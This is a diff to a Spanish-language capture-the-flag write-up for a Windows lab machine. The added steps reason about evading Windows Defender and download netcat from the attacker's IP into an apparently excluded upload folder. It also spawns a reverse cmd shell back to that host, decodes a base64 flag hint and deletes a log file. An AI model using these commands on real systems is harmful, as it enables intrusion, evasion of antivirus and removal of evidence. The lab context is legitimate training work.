@@ -144,7 +144,7 @@ Despues de analizar toda, empezaremos por el puerto 8080
 
   ![image](https://github.com/Esevka/CTF/assets/139042999/9b6a2630-2e5c-4def-92fb-880264e301ef)
 
-  Al encontrarse la aplicacion en dev-mode, pensamos en subir una reverse shell en powershell y bingo obtenemos shell en la maquina victima.
+  Al encontrarse la aplicacion en dev-mode(puede contener fallos), pensamos en subir una reverse shell en powershell.
 
   1) Creamos la reverse shell --> rs.ps1
 
@@ -161,13 +161,93 @@ Despues de analizar toda, empezaremos por el puerto 8080
           whoami
           hostevasion\evader
 
-## Postexplotacion(obtenemos flags y elevamos privilegios)
+## Post-explotacion(obtenemos flags y elevamos privilegios)
 
 - Subimos a la maquina victima netcat64.exe para obtener una shell mas interactiva y trabajar comodamente.
 
+  Cuando subimos netcat a la maquina victima el sistema nos lo borra, suponemos que tiene windows defender corriendo o algun otro sistema.
+
+- Lo primero que se me ocurre es buscar el directorio donde subimos el script en powershell, al estar en modo-dev posiblemente tenga una excepcion en windows defender.
+
+      pwd
+      C:\xampp\htdocs\uploads
+      iwr -uri http://10.9.92.151/nc64.exe -o nc.exe
+      dir
+      hello.ps1 index.php log.txt nc.exe rs.ps1 vulnerable.ps1
+      ./nc.exe -e cmd.exe 10.9.92.151 2000
+
+  Obtenemos shell mediante netcat y con ayuda de rlwrap conseguimos mejorar un poco la movilidad en la shell.
+    
+      ┌──(root㉿kali)-[/home/…/ctf/try_ctf/stealth/contenido]
+      └─# rlwrap nc -lnvp 2000  
+      listening on [any] 2000 ...
+      connect to [10.9.92.151] from (UNKNOWN) [10.10.74.249] 49821
+      Microsoft Windows [Version 10.0.17763.1821]
+      (c) 2018 Microsoft Corporation. All rights reserved.
+      
+      C:\xampp\htdocs\uploads>powershell
+      powershell
+      Windows PowerShell 
+      Copyright (C) Microsoft Corporation. All rights reserved.
+        
+      PS C:\xampp\htdocs\uploads> Get-Acl .\ | Format-List
+      Get-Acl .\ | Format-List
+      
+      Path   : Microsoft.PowerShell.Core\FileSystem::C:\xampp\htdocs\uploads
+      Owner  : HOSTEVASION\evader
+      Group  : HOSTEVASION\None
+      Access : BUILTIN\Users Allow  FullControl
+               NT AUTHORITY\SYSTEM Allow  FullControl
+               BUILTIN\Administrators Allow  FullControl
+               HOSTEVASION\evader Allow  FullControl    ------------> TENEMOS CONTROL TOTAL EN EL DIRECTORIO. <-------------
+               CREATOR OWNER Allow  268435456
+      Audit  : 
+      Sddl   : O:S-1-5-21-1966530601-3185510712-10604624-1022G:S-1-5-21-1966530601-3185510712-10604624-513D:AI(A;OICIID;FA;;;
+               BU)(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;ID;FA;;;S-1-5-21-1966530601-3185510712-10604624-1022)(A;OICIIOID;GA;
+               ;;CO)
+
+- Buscamos la flag de usuario.
+
+      PS C:\users\evader\desktop> dir
+      
+      Mode                LastWriteTime         Length Name                                                                  
+      ----                -------------         ------ ----                                                                  
+      -a----        6/21/2016   3:36 PM            527 EC2 Feedback.website                                                  
+      -a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website                                   
+      -a----         8/3/2023   7:12 PM            194 encodedflag                                                           
+      
+      PS C:\users\evader\desktop> type encodedflag
+      type encodedflag
+      -----BEGIN CERTIFICATE-----
+      WW91IGNhbiBnZXQgdGhlIGZsYWcgYnkgdmlzaXRpbmcgdGhlIGxpbmsgaHR0cDov
+      LzxJUF9PRl9USElTX1BDPjo4MDAwL2FzZGFzZGFkYXNkamFramRuc2Rmc2Rmcy5w
+      aHA=
+      -----END CERTIFICATE-----
+
+  - Vemos que la flag esta encodeada en base64 la decodeamos y encontramos una url llamativa.
+ 
+        ┌──(root㉿kali)-[/home/…/ctf/try_ctf/stealth/contenido]
+        └─# echo 'WW91IGNhbiBnZXQgdGhlIGZsYWcgYnkgdmlzaXRpbmcgdGhlIGxpbmsgaHR0cDov
+        LzxJUF9PRl9USElTX1BDPjo4MDAwL2FzZGFzZGFkYXNkamFramRuc2Rmc2Rmcy5w
+        aHA=' | base64 -d
+        You can get the flag by visiting the link http://<IP_OF_THIS_PC>:8000/asdasdadasdjakjdnsdfsdfs.php
+
+    ![image](https://github.com/Esevka/CTF/assets/139042999/95feb49b-8029-4465-b386-4dcb21ea9a4d)
+
+  - Vamos a borrar los logs como nos indica la pista de la imagen anterior y tras recargar la pagina de nuevo obtenemos la flag de usuario.
+ 
+        PS C:\xampp\htdocs\uploads> rm log.txt
+        rm log.txt
+    
+    ![image](https://github.com/Esevka/CTF/assets/139042999/a021c707-747a-486e-bed8-f1413e74946f)
 
 
+- Elevamos Privilegios
 
+
+    
+
+    
 
 
 
